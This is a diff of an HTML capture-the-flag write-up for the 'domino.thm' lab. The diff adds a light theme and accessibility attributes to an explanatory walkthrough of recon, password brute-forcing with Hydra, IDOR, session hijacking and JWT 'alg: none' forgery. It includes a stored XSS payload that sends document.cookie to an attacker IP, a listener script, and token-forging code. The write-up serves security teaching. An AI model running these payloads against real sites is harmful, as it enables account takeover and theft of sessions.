@@ -26,6 +26,11 @@
       --font-display: 'Barlow Condensed', sans-serif;
       --font-mono: 'Share Tech Mono', monospace;
     }
+      [data-theme="light"] {
+        --bg: #f0f4f8; --bg2: #e2e8f0; --surface: #ffffff;
+        --border: #cbd5e1; --accent: #0077aa; --accent2: #00704a;
+        --accent3: #c22243; --text: #0f172a; --text2: #475569; --text3: #5b6b7f;
+      }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { background: var(--bg); color: var(--text); font-family: var(--font-mono); line-height: 1.8; padding: 0; }
     .wr-header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 1rem 2rem; display: flex; align-items: center; gap: 1rem; position: sticky; top: 0; z-index: 100; }
@@ -70,6 +75,7 @@
       .wr-summary-key { min-width: 0; }
     }
   </style>
+  <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
 </head>
 <body>
   <div class="wr-header">
@@ -130,7 +136,7 @@
       <div class="wr-phase" id="environment-setup">
         <h2 class="wr-phase-title">1. Environment Setup</h2>
         <h3 class="wr-h3">Adding the target to <span class="wr-inline-code">/etc/hosts</span></h3>
-        <div class="wr-code">echo "10.128.172.213  domino.thm" | sudo tee -a /etc/hosts</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo "10.128.172.213  domino.thm" | sudo tee -a /etc/hosts</div>
         <p class="wr-p"><strong>Why we did this:</strong> Computers turn human-readable names like <span class="wr-inline-code">google.com</span> into IP addresses using DNS (Domain Name System). But before checking the internet's DNS servers, every computer first checks a local file called <span class="wr-inline-code">/etc/hosts</span> &mdash; a simple text file that manually maps a name to an IP. By adding this line, we told our attack machine: "whenever I ask for <span class="wr-inline-code">domino.thm</span>, just use <span class="wr-inline-code">10.128.172.213</span> &mdash; don't bother asking DNS."</p>
         <p class="wr-p"><strong>Why it mattered for this room specifically:</strong> Many web applications check the <span class="wr-inline-code">Host:</span> header of an incoming request and behave differently (or break entirely) if you access them by raw IP instead of their expected hostname &mdash; this is called <strong>virtual hosting</strong>. Browsing straight to <span class="wr-inline-code">http://10.128.172.213/</span> might serve a default Apache page, broken links, or a redirect loop, while <span class="wr-inline-code">http://domino.thm/</span> serves the real app correctly.</p>
         <p class="wr-p"><strong>Command breakdown, piece by piece:</strong></p>
@@ -144,7 +150,7 @@
       <div class="wr-phase" id="phase-1-network-recon">
         <h2 class="wr-phase-title">2. Phase 1: Network Recon</h2>
         <h3 class="wr-h3">Full port scan</h3>
-        <div class="wr-code">nmap -p- -T4 -oN domino_full.txt domino.thm</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nmap -p- -T4 -oN domino_full.txt domino.thm</div>
         <p class="wr-p"><strong>Why we did this first, before touching the web app at all:</strong> You never assume you know a target's full attack surface. A web app might be the "front door," but there could be other open doors &mdash; an exposed database, an admin SSH interface on a weird port, an internal API on a completely different port. Scanning <em>every</em> port (not just the common ones) is the professional default, not an optional extra step.</p>
         <p class="wr-p"><strong>Command breakdown:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
@@ -155,12 +161,12 @@
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">domino.thm</span> &mdash; the target, using the hostname we set up in <span class="wr-inline-code">/etc/hosts</span>.</li>
         </ul>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">PORT   STATE SERVICE
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http</div>
         <p class="wr-p">Only two ports open. This immediately told us: <strong>the entire attack surface is the web application on port 80.</strong> Port 22 (SSH) exists, but with no credentials yet, it's not a usable entry point &mdash; it becomes relevant later, once we have valid login details to use.</p>
         <h3 class="wr-h3">Version and script scan</h3>
-        <div class="wr-code">nmap -p22,80 -sC -sV -oN domino_detailed.txt domino.thm</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nmap -p22,80 -sC -sV -oN domino_detailed.txt domino.thm</div>
         <p class="wr-p"><strong>Why a second, more targeted scan:</strong> The first scan only tells you <em>which ports are open</em>. This second scan tells you <em>what software</em> is running on them and <em>what version</em> &mdash; critical, because specific software versions sometimes have known, public vulnerabilities (CVEs) you can look up and exploit directly.</p>
         <p class="wr-p"><strong>Command breakdown:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
@@ -169,7 +175,7 @@
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">-sV</span> &mdash; <strong>version detection</strong> &mdash; Nmap sends specific probes designed to make services reveal their exact software name and version number.</li>
         </ul>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
 80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
 |_http-title: NexusCorp Portal</div>
         <p class="wr-p"><strong>What this told us:</strong> Both OpenSSH 9.6p1 and Apache 2.4.58 are recent, patched versions with no significant public unauthenticated exploits. <strong>This is actually useful information</strong> &mdash; it tells you <em>not</em> to waste time searching for a "magic exploit" against the web server software itself. The vulnerability isn't in Apache or SSH; it's going to be in the custom application code running on top of them. This matches the room's own briefing about "misconfigurations and logic flaws."</p>
@@ -182,7 +188,7 @@
         <h3 class="wr-h3">Viewing page source</h3>
         <p class="wr-p">Every browser lets you see the raw HTML of a page with <span class="wr-inline-code">Ctrl+U</span> (View Page Source). This shows you the actual code the server sent, including things that aren't visually obvious on the rendered page &mdash; HTML comments, hidden form fields, and crucially, <strong>the exact destination of every link</strong> (the <span class="wr-inline-code">href</span> attribute).</p>
         <p class="wr-p">On the login page, we found:</p>
-        <div class="wr-code">&lt;form method="POST" action="/index.php"&gt;
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">&lt;form method="POST" action="/index.php"&gt;
   &lt;input type="text" name="username" placeholder="firstname.lastname" required&gt;
   &lt;input type="password" name="password" placeholder="Password" required&gt;
 &lt;/form&gt;
@@ -196,7 +202,7 @@
         </ol>
         <h3 class="wr-h3">The Team page &mdash; username harvesting</h3>
         <p class="wr-p">Visiting <span class="wr-inline-code">/team.php</span> (a public page, no login required) listed every employee with their full name and corporate email:</p>
-        <div class="wr-code">Laura Hayes — laura.hayes@nexus.corp
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">Laura Hayes — laura.hayes@nexus.corp
 Michael Chen — michael.chen@nexus.corp
 Sarah Johnson — sarah.johnson@nexus.corp
 Robert Wilson — robert.wilson@nexus.corp
@@ -205,7 +211,7 @@ David Brown — david.brown@nexus.corp
 James Wright — james.wright@nexus.corp</div>
         <p class="wr-p"><strong>Why this matters:</strong> Combined with the <span class="wr-inline-code">firstname.lastname</span> convention we found on the login page, we now have a complete, high-confidence list of real usernames &mdash; <span class="wr-inline-code">laura.hayes</span>, <span class="wr-inline-code">michael.chen</span>, <span class="wr-inline-code">sarah.johnson</span>, etc. &mdash; without guessing or brute-forcing usernames at all. This is called <strong>user enumeration</strong>, and public "About Us" or "Our Team" pages are one of the most common real-world sources for it. Companies love showing off their staff; attackers love that they do.</p>
         <p class="wr-p">We saved this list to a file:</p>
-        <div class="wr-code">cat &lt;&lt; 'EOF' &gt; users.txt
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat &lt;&lt; 'EOF' &gt; users.txt
 laura.hayes
 michael.chen
 sarah.johnson
@@ -239,7 +245,7 @@ EOF</div>
       <div class="wr-phase" id="phase-3-directory-enumeration">
         <h2 class="wr-phase-title">4. Phase 3: Directory Enumeration</h2>
         <h3 class="wr-h3">Gobuster scan</h3>
-        <div class="wr-code">gobuster dir -u http://domino.thm/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_domino.txt</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">gobuster dir -u http://domino.thm/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_domino.txt</div>
         <p class="wr-p"><strong>Why:</strong> This finds pages and folders that exist on the server but aren't linked from anywhere we can click. The tool works by taking a giant list of common file/folder names (the "wordlist") and requesting each one, one at a time, checking whether the server responds with something other than "404 Not Found."</p>
         <p class="wr-p"><strong>Command breakdown:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
@@ -249,7 +255,7 @@ EOF</div>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">-o gobuster_domino.txt</span> &mdash; save output to a file.</li>
         </ul>
         <p class="wr-p"><strong>Result &mdash; six real directories found:</strong></p>
-        <div class="wr-code">/admin      (301) → /admin/
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">/admin      (301) → /admin/
 /api        (301) → /api/
 /backup     (301) → /backup/
 /javascript (301) → /javascript/
@@ -258,7 +264,7 @@ EOF</div>
         <p class="wr-p"><em>(A <span class="wr-inline-code">301</span> status code means "Moved Permanently" &mdash; Apache is redirecting requests for the bare folder name to the folder name with a trailing slash, e.g. <span class="wr-inline-code">/admin</span> → <span class="wr-inline-code">/admin/</span>. This is standard, expected Apache behavior for directories, not a vulnerability by itself.)</em></p>
         <p class="wr-p"><strong>Why <span class="wr-inline-code">/backup</span> stood out immediately:</strong> Folders named "backup," "old," "test," or "dev" on a live production-style app are a huge red flag in real-world pentesting. They frequently contain forgotten config files, old source code, or credentials that were never meant to be publicly reachable, but were left there anyway &mdash; usually because a developer put them there "temporarily" and forgot.</p>
         <h3 class="wr-h3">Checking for directory listing</h3>
-        <div class="wr-code">curl http://domino.thm/backup/</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl http://domino.thm/backup/</div>
         <p class="wr-p"><strong>Command breakdown:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">curl</span> &mdash; a command-line tool for making HTTP requests and displaying the raw response, without needing a browser.</li>
@@ -269,19 +275,19 @@ EOF</div>
       <div class="wr-phase" id="phase-4-the-backup-files-aes-decryption">
         <h2 class="wr-phase-title">5. Phase 4: The Backup Files &mdash; AES Decryption</h2>
         <h3 class="wr-h3">Reading the README</h3>
-        <div class="wr-code">curl http://domino.thm/backup/README.txt</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl http://domino.thm/backup/README.txt</div>
         <p class="wr-p">Result:</p>
-        <div class="wr-code">NexusCorp Backup Configuration
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">NexusCorp Backup Configuration
 ================================
 config.enc  - Encrypted application configuration (AES-128-ECB)
 Decryption key reference: see static/app.js (deployment notes)</div>
         <p class="wr-p">This told us exactly what we were dealing with: a file encrypted with <strong>AES-128 in ECB mode</strong>, and pointed us to another file &mdash; <span class="wr-inline-code">static/app.js</span> &mdash; for the decryption key.</p>
         <h3 class="wr-h3">Finding the leaked key</h3>
         <p class="wr-p">We first checked <span class="wr-inline-code">/static/</span> (also had directory listing enabled) and found <span class="wr-inline-code">app.js</span>, then downloaded it:</p>
-        <div class="wr-code">curl --output - http://domino.thm/static/app.js</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl --output - http://domino.thm/static/app.js</div>
         <p class="wr-p"><em>(We had to use <span class="wr-inline-code">--output -</span> here because plain <span class="wr-inline-code">curl</span> detected some non-text-looking bytes in the response and refused to dump it straight to the terminal, as a safety measure to avoid messing up terminal display. <span class="wr-inline-code">--output -</span> forces it to print anyway.)</em></p>
         <p class="wr-p">Inside, we found this in plain, unobfuscated JavaScript comments:</p>
-        <div class="wr-code">// Encryption key for backup config decryption - AES-ECB-128
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">// Encryption key for backup config decryption - AES-ECB-128
 // Key: N3xusK3y2024!!  (pad to 16 bytes with )
 _backupKey: 'N3xusK3y2024!!',</div>
         <p class="wr-p"><strong>This is a real, extremely common vulnerability: Hardcoded Secrets in Client-Side Code.</strong></p>
@@ -289,7 +295,7 @@ _backupKey: 'N3xusK3y2024!!',</div>
         <p class="wr-p"><strong>Why it matters:</strong> Anyone &mdash; not just this room's attacker &mdash; can view a website's JS files (they're just downloaded and interpreted by your browser) as easily as you'd open a text file.</p>
         <p class="wr-p"><strong>How to prevent it:</strong> Secrets like encryption keys should only ever exist server-side, never shipped to the client.</p>
         <h3 class="wr-h3">Writing the decryption script</h3>
-        <div class="wr-code">from Crypto.Cipher import AES
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">from Crypto.Cipher import AES
 
 key = b'N3xusK3y2024!!' + b'\x00' * 2   # pad 14 bytes -&gt; 16 with null bytes
 data = open('config.enc', 'rb').read()
@@ -306,7 +312,7 @@ print(plaintext)</div>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">plaintext = cipher.decrypt(data)</span> &mdash; actually performs the decryption.</li>
         </ul>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">b'{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}\x0e\x0e\x0e...'</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">b'{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}\x0e\x0e\x0e...'</div>
         <p class="wr-p"><strong>Two things to explain here:</strong></p>
         <ol style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><strong>The trailing <span class="wr-inline-code">\x0e</span> bytes are not an error &mdash; this is PKCS7 padding.</strong> Block ciphers like AES can only encrypt data in fixed-size chunks (16 bytes for AES). If your actual data isn't a perfect multiple of 16 bytes, padding bytes get added to fill out the last block before encryption. PKCS7 padding has a clever rule: the <em>value</em> of each padding byte equals the <em>number</em> of padding bytes added. Here, <span class="wr-inline-code">\x0e</span> in hexadecimal equals <span class="wr-inline-code">14</span> in decimal &mdash; meaning 14 bytes of padding were added, which we can see matches the count. This is expected and harmless; the real data (the JSON) is unaffected.</li>
@@ -321,10 +327,10 @@ print(plaintext)</div>
         <p class="wr-p">With 7 confirmed usernames and a known login endpoint, the next step was attempting to brute-force passwords.</p>
         <h3 class="wr-h3">Getting the exact failure message first</h3>
         <p class="wr-p">Before running any brute-force tool, you must know <strong>exactly</strong> what text the application shows on a <em>failed</em> login &mdash; not guess it. We submitted a deliberately wrong password and got:</p>
-        <div class="wr-code">Invalid credentials</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">Invalid credentials</div>
         <p class="wr-p">(No trailing period &mdash; a detail that mattered, explained below.)</p>
         <h3 class="wr-h3">The Hydra command</h3>
-        <div class="wr-code">hydra -L users.txt -P pass_small.txt domino.thm http-post-form "/index.php:username=^USER^&amp;password=^PASS^:F=Invalid credentials" -I</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">hydra -L users.txt -P pass_small.txt domino.thm http-post-form "/index.php:username=^USER^&amp;password=^PASS^:F=Invalid credentials" -I</div>
         <p class="wr-p"><strong>Command breakdown, piece by piece:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">hydra</span> &mdash; a fast network login brute-forcer supporting many protocols (SSH, FTP, web forms, etc.).</li>
@@ -337,10 +343,10 @@ print(plaintext)</div>
         </ul>
         <h3 class="wr-h3">Why we used a trimmed wordlist instead of the full rockyou.txt</h3>
         <p class="wr-p">Our first attempt used the full <span class="wr-inline-code">rockyou.txt</span> (a famous leaked password list containing ~14.3 million real-world passwords). With 7 usernames, that's over 100 million total login attempts &mdash; completely impractical for a room with a limited session time. We killed it and instead used:</p>
-        <div class="wr-code">head -n 10000 /usr/share/wordlists/rockyou.txt &gt; pass_small.txt</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">head -n 10000 /usr/share/wordlists/rockyou.txt &gt; pass_small.txt</div>
         <p class="wr-p"><span class="wr-inline-code">head -n 10000</span> takes just the first 10,000 lines of the file. Since <span class="wr-inline-code">rockyou.txt</span> is roughly sorted by how frequently each password appeared in the real-world data breach it came from, the top 10,000 entries cover the overwhelming majority of genuinely weak/common passwords &mdash; exactly the kind a deliberately vulnerable lab machine is built to use.</p>
         <h3 class="wr-h3">Result</h3>
-        <div class="wr-code">[80][http-post-form] host: domino.thm   login: sarah.johnson   password: password
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">[80][http-post-form] host: domino.thm   login: sarah.johnson   password: password
 [80][http-post-form] host: domino.thm   login: robert.wilson   password: password
 [80][http-post-form] host: domino.thm   login: emma.taylor     password: password</div>
         <p class="wr-p">Three valid accounts, all sharing the trivially weak password <span class="wr-inline-code">password</span>. We proceeded with <span class="wr-inline-code">sarah.johnson</span>.</p>
@@ -349,11 +355,11 @@ print(plaintext)</div>
       <div class="wr-phase" id="flag-1-idor-insecure-direct-object-reference">
         <h2 class="wr-phase-title">7. Flag 1: IDOR (Insecure Direct Object Reference)</h2>
         <p class="wr-p">After logging in as <span class="wr-inline-code">sarah.johnson</span>, the dashboard showed a link:</p>
-        <div class="wr-code">&lt;a href="/api/users/profile.php?id=3"&gt;My Profile API&lt;/a&gt;</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">&lt;a href="/api/users/profile.php?id=3"&gt;My Profile API&lt;/a&gt;</div>
         <p class="wr-p"><span class="wr-inline-code">id=3</span> corresponded to Sarah's own account. The obvious question: <strong>what happens if we just change the number?</strong></p>
-        <div class="wr-code">http://domino.thm/api/users/profile.php?id=1</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">http://domino.thm/api/users/profile.php?id=1</div>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">{
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">{
   "id": 1,
   "username": "laura.hayes",
   "email": "laura.hayes@nexus.corp",
@@ -374,16 +380,16 @@ print(plaintext)</div>
         <h3 class="wr-h3">Why we needed a different technique here</h3>
         <p class="wr-p"><span class="wr-inline-code">/admin/</span> returned a clean <span class="wr-inline-code">403 Forbidden</span> when visited as <span class="wr-inline-code">sarah.johnson</span>. Unlike the IDOR bug, this endpoint <em>does</em> correctly check the logged-in user's role server-side. We needed to actually <strong>become</strong> an admin user at the session level, not just request admin data through a broken endpoint.</p>
         <h3 class="wr-h3">Checking cookie security</h3>
-        <div class="wr-code">document.cookie</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">document.cookie</div>
         <p class="wr-p">(typed into the browser's DevTools Console, <span class="wr-inline-code">F12</span> → Console tab)</p>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">nexus_session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65...</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nexus_session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65...</div>
         <p class="wr-p"><strong>Why this check matters:</strong> <span class="wr-inline-code">document.cookie</span> is a browser JavaScript API that returns any cookies for the current site that are readable by JavaScript. Cookies <em>can</em> be marked with an <span class="wr-inline-code">HttpOnly</span> flag by the server, which tells browsers "never let any JavaScript touch this cookie, only send it in HTTP requests." If a session cookie is <span class="wr-inline-code">HttpOnly</span>, then even if an attacker manages to run malicious JavaScript on a page (via XSS), they <strong>cannot</strong> read the cookie value directly.</p>
         <p class="wr-p">Here, the cookie <em>was</em> readable via <span class="wr-inline-code">document.cookie</span> &mdash; confirming <span class="wr-inline-code">HttpOnly</span> was <strong>not</strong> set. This meant that if we could get malicious JavaScript to run in someone else's browser while they're logged in, we could steal their session cookie directly.</p>
         <h3 class="wr-h3">The support ticket / XSS injection point</h3>
         <p class="wr-p">The "Open Ticket" form (<span class="wr-inline-code">/support/create.php</span>) accepts free-text Subject and Message fields &mdash; a classic place where user input later gets <em>displayed</em> somewhere else (in an admin's ticket review interface), which is exactly the pattern that enables <strong>Stored XSS</strong>.</p>
         <p class="wr-p">We submitted this as the payload:</p>
-        <div class="wr-code">&lt;img src=x onerror="new Image().src='http://10.128.111.101/steal?c='+document.cookie"&gt;</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">&lt;img src=x onerror="new Image().src='http://10.128.111.101/steal?c='+document.cookie"&gt;</div>
         <p class="wr-p"><strong>Payload breakdown, piece by piece:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">&lt;img src=x&gt;</span> &mdash; an <span class="wr-inline-code">&lt;img&gt;</span> HTML tag with a deliberately broken/invalid <span class="wr-inline-code">src</span> attribute (<span class="wr-inline-code">x</span> is not a real image path). Browsers will attempt to load it, fail, and trigger an error.</li>
@@ -395,7 +401,7 @@ print(plaintext)</div>
         <p class="wr-p"><strong>What it is:</strong> "Stored" XSS means the malicious payload is saved persistently by the application (in this case, in a support ticket in a database) and gets served back out and executed <strong>whenever anyone else views that stored content</strong> &mdash; as opposed to "reflected" XSS, where the payload only executes immediately for whoever clicks a specially crafted link.</p>
         <p class="wr-p"><strong>"Blind" specifically means:</strong> the attacker never sees the payload actually execute or interact with the victim's browser directly &mdash; they only see the <em>side effect</em> (in our case, an incoming HTTP request to our listening server) sometime later, possibly minutes, hours, or even days afterward, whenever the victim/system happens to view the stored content.</p>
         <h3 class="wr-h3">Setting up to catch the callback</h3>
-        <div class="wr-code">cat &lt;&lt; 'EOF' &gt; listener.py
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat &lt;&lt; 'EOF' &gt; listener.py
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class Handler(BaseHTTPRequestHandler):
@@ -421,7 +427,7 @@ python3 listener.py</div>
         </ul>
         <h3 class="wr-h3">The result</h3>
         <p class="wr-p">After submitting the ticket, the listener caught this incoming request:</p>
-        <div class="wr-code">--- GET /steal?c= ---
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">--- GET /steal?c= ---
 Host: 10.128.111.101
 User-Agent: python-requests/2.31.0
 Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834</div>
@@ -429,10 +435,10 @@ Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgIn
         <p class="wr-p">Look at the <span class="wr-inline-code">User-Agent</span> header: <span class="wr-inline-code">python-requests/2.31.0</span>. This tells us the "admin" reviewing the ticket wasn't a real human using a real browser &mdash; it was an <strong>automated Python script/bot</strong> fetching the ticket content. A Python <span class="wr-inline-code">requests</span>-based bot has no JavaScript engine at all &mdash; it can't execute our <span class="wr-inline-code">&lt;img onerror&gt;</span> payload, which is <em>why</em> <span class="wr-inline-code">document.cookie</span> never got appended to the URL (<span class="wr-inline-code">c=</span> stayed empty; there was no JavaScript execution to populate it).</p>
         <p class="wr-p"><strong>However</strong>, that bot still made an authenticated HTTP request to review the ticket &mdash; using its own real, valid, server-signed session cookie, which showed up automatically in the <span class="wr-inline-code">Cookie:</span> header of the request it sent to our server. This is technically closer to a <strong>Server-Side Request Forgery (SSRF)</strong>-flavored variant than classic browser-based XSS (the bot fetching an attacker-controlled URL while authenticated), but the practical outcome is identical: we captured a fully valid admin session.</p>
         <h3 class="wr-h3">Using the stolen cookie</h3>
-        <div class="wr-code">document.cookie = "nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834; path=/"</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">document.cookie = "nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834; path=/"</div>
         <p class="wr-p">Typed into the browser console (on any page of <span class="wr-inline-code">domino.thm</span>), this <strong>overwrites</strong> the browser's current cookie for this site with the stolen admin cookie value. <span class="wr-inline-code">path=/</span> means "this cookie applies to every page on this site," matching how cookies are normally scoped.</p>
         <p class="wr-p">Navigating to <span class="wr-inline-code">/admin/</span> afterward loaded successfully:</p>
-        <div class="wr-code">Logged in as: laura.hayes
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">Logged in as: laura.hayes
 Internal reference: THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</div>
         <p class="wr-p"><strong>Flag 2 obtained: <span class="wr-inline-code">THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</span></strong></p>
         <p class="wr-p"><strong>How defenders prevent this class of bug entirely:</strong></p>
@@ -446,18 +452,18 @@ Internal reference: THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</div>
         <h2 class="wr-phase-title">9. Flag 3: JWT Forgery + RFI → RCE</h2>
         <h3 class="wr-h3">Understanding JWTs first</h3>
         <p class="wr-p">The app's dashboard mentioned fetching a JWT (JSON Web Token) from <span class="wr-inline-code">/api/auth/token.php</span> for use with a separate "File Viewer" API. We fetched ours:</p>
-        <div class="wr-code">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODkzMjk4MzQsImV4cCI6MTc4OTMzMzQzNH0.RZu4rCgy+SloODdmwY1AuapRn7Lp8QHSlzuSPbckzow</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODkzMjk4MzQsImV4cCI6MTc4OTMzMzQzNH0.RZu4rCgy+SloODdmwY1AuapRn7Lp8QHSlzuSPbckzow</div>
         <p class="wr-p"><strong>A JWT always has this exact structure: <span class="wr-inline-code">header.payload.signature</span>, three parts separated by periods, each individually base64url-encoded.</strong></p>
         <p class="wr-p">Decoding the first two parts (base64 is easily reversible &mdash; it's an <em>encoding</em>, not encryption):</p>
         <p class="wr-p"><strong>Header:</strong></p>
-        <div class="wr-code">{"alg":"HS256","typ":"JWT"}</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">{"alg":"HS256","typ":"JWT"}</div>
         <p class="wr-p"><strong>Payload:</strong></p>
-        <div class="wr-code">{"sub":"sarah.johnson","role":"user","iat":1789329834,"exp":1789333434}</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">{"sub":"sarah.johnson","role":"user","iat":1789329834,"exp":1789333434}</div>
         <p class="wr-p"><strong>Why anyone can read this:</strong> base64 is just a way of representing binary data as text &mdash; it has no secret key, no password, nothing preventing anyone from decoding it. <span class="wr-inline-code">alg: HS256</span> means the token is signed (not encrypted) using HMAC-SHA256, a symmetric algorithm &mdash; meaning the same secret key both creates and verifies the signature. Without that secret key, an attacker can <em>read</em> the payload freely, but shouldn't be able to <em>forge</em> a valid new signature for a modified payload.</p>
         <h3 class="wr-h3">The vulnerability: JWT "alg: none" bypass</h3>
         <p class="wr-p"><strong>What it is:</strong> The JWT specification technically allows an algorithm value of <span class="wr-inline-code">none</span>, meaning "this token is intentionally unsigned, don't verify anything." This exists for legitimate niche internal use cases. The vulnerability occurs when a server's JWT-verification code blindly trusts whatever algorithm value is written inside the <em>token itself</em> (which the attacker fully controls, since they can just write a new one), rather than the server enforcing a single fixed, expected algorithm.</p>
         <p class="wr-p"><strong>How we exploited it &mdash; building a forged token by hand:</strong></p>
-        <div class="wr-code">import base64
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">import base64
 import json
 
 header = {"alg": "none", "typ": "JWT"}
@@ -483,35 +489,35 @@ print(forged_token)</div>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">forged_token = f"{header_b64}.{payload_b64}."</span> &mdash; joins our custom header and payload with a period, and appends a <strong>trailing period with absolutely nothing after it</strong> &mdash; representing an empty, non-existent signature section, matching the <span class="wr-inline-code">alg: none</span> claim.</li>
         </ul>
         <p class="wr-p"><strong>Testing it:</strong></p>
-        <div class="wr-code">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name="</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name="</div>
         <p class="wr-p">Before forging: <span class="wr-inline-code">"JWT token required."</span> &mdash; no token supplied. After forging: <span class="wr-inline-code">"Missing name parameter"</span> &mdash; a completely different error message, about the <em>next</em> step of server-side logic. <strong>This confirms the server accepted our unsigned, tampered token as valid</strong> &mdash; it moved past authentication entirely and started processing our (empty) <span class="wr-inline-code">name</span> parameter instead. This is a genuine, working exploit.</p>
         <h3 class="wr-h3">Testing LFI (Local File Inclusion)</h3>
